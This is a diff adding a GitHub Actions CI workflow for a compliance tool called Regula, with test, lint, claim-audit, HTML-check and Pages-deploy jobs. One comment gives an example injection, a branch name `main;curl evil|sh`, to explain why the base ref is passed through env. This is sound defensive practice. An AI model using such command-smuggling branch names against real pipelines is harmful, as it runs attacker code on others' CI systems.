@@ -1,0 +1,245 @@
+name: CI
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+# Least-privilege default; jobs that need more declare it at job level
+# (release.yml's publish job declares id-token: write itself).
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: ["3.10", "3.11", "3.12", "3.13"]
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: ${{ matrix.python-version }}
+      - run: pip install pyyaml "pytest~=9.0" "jsonschema~=4.0" "cryptography>=50.0.0,<51" "asn1crypto>=1.5.1,<2"
+      - name: Custom test runner (manual list — asserts every test is registered)
+        run: python3 tests/test_classification.py
+      - name: pytest discovery (catches anything not in the manual list)
+        run: pytest tests/ -q --durations=50 --durations-min=0.1
+      - name: Built-in self-test
+        run: python3 -m scripts.cli self-test
+      - name: Doctor health checks
+        run: python3 -m scripts.cli doctor
+      - name: Security self-check (blocks unexpected findings in Regula's own source)
+        run: python3 -m scripts.cli security-self-check
+      - name: Quoted regulatory passages are verbatim
+        # A quotation is a promise that the source says exactly this. The site
+        # shipped one that was not (Article 3(4), "any" for "a", exclusion
+        # dropped) and six more were found when this check was first run.
+        # Corpora are cached under references/corpora, so this runs offline.
+        run: python3 scripts/verify_quotations.py
+      - name: Published CLI transcripts reproduce
+        # Nine tracked surfaces published a `Verdict:` line as CLI output while
+        # no command emitted `Verdict:` at all, and two guides published a
+        # per-article `Overall score: NN%` from a formatter no CLI path
+        # reaches. Both asserted conclusions the tool does not make. This runs
+        # the command each page documents and compares.
+        run: python3 scripts/verify_transcripts.py
+      - name: Browser questionnaire contract test
+        # This file existed but no runner executed it, so it drifted from the
+        # pages it guards (LEDGER F15). It is wired in here because the browser
+        # assessment has no other regression gate.
+        run: node tests/test_questionnaire_scoring.js
+
+  lint:
+    name: Lint (ruff)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      - run: pip install ruff
+      # Gate history, because each widening was paid for.
+      #
+      # F401/F841 joined F821/F811 on 2026-08-15. They had been left ungated as
+      # "style", and 18 accumulated. Four of them were not style at all: three
+      # names in classify_risk.py were re-exports that seven call sites import
+      # FROM that module, so `ruff --fix`, which offered to remove them, would
+      # have broken the build. Gating them keeps the count at zero, which is
+      # the only level at which the distinction stays cheap to make.
+      #
+      # E4/E7/E9 joined the same day. 32 findings sat outside both the old and
+      # the new gate and were declared as "formatting-class, deliberate scope
+      # decision". Leaving a class ungated is how the previous 18 accumulated,
+      # and the same reasoning applied twice would have kept it going, so they
+      # were cleared instead: two E731 lambdas became `term_style.plain`, and
+      # 28 compound statements were expanded. The public-surface generator's
+      # output was diffed before and after to prove the expansion inert.
+      #
+      # The set is named explicitly rather than left to ruff's default so a
+      # ruff upgrade cannot silently widen or narrow what this gate tests.
+      # E402 stays ignored: every scripts/ module does sys.path.insert before
+      # its imports by design (.claude/rules/python-scripts.md).
+      - name: Check for genuine code issues
+        run: ruff check scripts/ tests/ --select E4,E7,E9,F --ignore E402 --exclude "tests/fixtures"
+
+  locale-links:
+    name: Cross-language links declare their language
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      # A German or Brazilian page linking to an English-only page said
+      # nothing about it. The audit found one instance, on /pricing.html;
+      # enumeration found 82 across 8 localised pages, and hand-reading had
+      # found 4 pages. This keeps the count at zero rather than re-deriving
+      # it after the next page is added. Not a WCAG conformance check: see the
+      # module docstring for what is and is not claimed.
+      - name: Check hreflang on cross-language links
+        run: python3 scripts/locale_link_audit.py --check
+
+  determination-guard:
+    name: No output asserts a compliance state
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      # The project's hard rule, gated. Three shipped paths stated a compliance
+      # determination and none of the guards that existed could see it: the
+      # multilingual claim guard had arms for four claim classes and none for
+      # asserting a state, and the transcript guard's retired-marker list does
+      # not contain the word. LEDGER N125. The corpus includes .svg, which the
+      # delivery inventory, the claim auditor and the transcript guard all skip.
+      - name: Prove the guard can fail before trusting it
+        run: python3 scripts/determination_guard.py --control
+      - name: Check no scanned surface asserts a compliance state
+        run: python3 scripts/determination_guard.py --check
+
+  html-wellformed:
+    name: HTML well-formedness (landing pages)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      - name: Check all *.html parse with zero mismatched tags
+        run: |
+          python3 - <<'PY'
+          import html.parser, sys, glob
+          class P(html.parser.HTMLParser):
+              def __init__(self):
+                  super().__init__()
+                  self.stack = []
+                  self.errs = []
+              def handle_starttag(self, t, a):
+                  if t not in ('br','img','meta','link','input','hr','source'):
+                      self.stack.append(t)
+              def handle_endtag(self, t):
+                  if self.stack and self.stack[-1] == t:
+                      self.stack.pop()
+                  else:
+                      self.errs.append(f"mismatch {t} at line {self.getpos()[0]}")
+          fail = 0
+          for f in sorted(glob.glob("site/**/*.html", recursive=True)):
+              p = P()
+              try:
+                  p.feed(open(f, encoding='utf-8').read())
+                  if p.stack or p.errs:
+                      print(f"::error file={f}::unclosed={len(p.stack)} errs={len(p.errs)}")
+                      fail = 1
+                  else:
+                      print(f"{f}: OK")
+              except Exception as e:
+                  print(f"::error file={f}::{e}")
+                  fail = 1
+          sys.exit(fail)
+          PY
+
+  claim-audit:
+    name: Claim auditor (docs & landing pages)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      # site_facts measures total_collected via pytest --collect-only, and
+      # collection imports the test modules — install the same deps as the
+      # test matrix or the count is unmeasurable (site_facts then exits 1).
+      - run: pip install pyyaml "pytest~=9.0" "jsonschema~=4.0" "cryptography>=50.0.0,<51" "asn1crypto>=1.5.1,<2"
+      - name: Scan modified Markdown/HTML for unverified claims
+        env:
+          # Passed via env, never interpolated into the shell. `base_ref` is
+          # a branch name chosen by whoever opens the PR — on a fork that is
+          # an untrusted party, and `${{ }}` expansion happens before the
+          # shell runs, so a branch named `main;curl evil|sh` would execute.
+          BASE_REF: ${{ github.base_ref }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          if [ "$EVENT_NAME" = "pull_request" ]; then
+            python3 scripts/claim_auditor.py --diff-base "origin/$BASE_REF"
+          else
+            python3 scripts/claim_auditor.py --diff-base HEAD~1
+          fi
+      - name: Verify site_facts artifacts are up-to-date
+        run: |
+          python3 -m scripts.site_facts
+          git diff --exit-code data/site_facts.json data/site_facts.md
+      - name: Verify published numbers match canonical counts
+        run: python3 scripts/claim_auditor.py --verify-facts
+      - name: Verify sitemap coverage and modification dates
+        run: |
+          python3 scripts/update_sitemap.py
+          git diff --exit-code site/sitemap.xml
+
+  deploy:
+    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
+    needs: test
+    concurrency:
+      group: pages
+      cancel-in-progress: true
+    runs-on: ubuntu-latest
+    permissions:
+      pages: write
+      id-token: write
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d # v6
+      - uses: actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9 # v5
+        with:
+          # Site sources live under ./site/ after the IA restructure.
+          # The artifact's contents become the root of the deployed site
+          # (e.g. site/index.html → https://getregula.com/,
+          #       site/regions/uae.html → https://getregula.com/regions/uae.html).
+          path: './site'
+      - uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128 # v5
+        id: deployment
+        with:
+          # MEASURED 2026-08-06. The action's default status-poll budget is
+          # 600000ms. The deploy job for 1fd5084 started 14:26:15Z and the
+          # action gave up at 14:36:28Z, 10m13s later, reporting failure. The
+          # site's own `last-modified` header is 14:37:50Z: the deployment
+          # SUCCEEDED 82 seconds after the action stopped waiting. So the job
+          # was reporting a false negative and turning main's CI red on every
+          # push while publishing correctly.
+          #
+          # This is NOT the N28 wall-clock class and must not be read as it.
+          # N28 forbids widening a threshold that asserts something about THIS
+          # repository's code. This is a client-side poll budget for an
+          # asynchronous operation on someone else's infrastructure, where the
+          # only thing the number expresses is how long we are willing to wait
+          # for GitHub. Nothing about the site is asserted by it.
+          timeout: 1200000
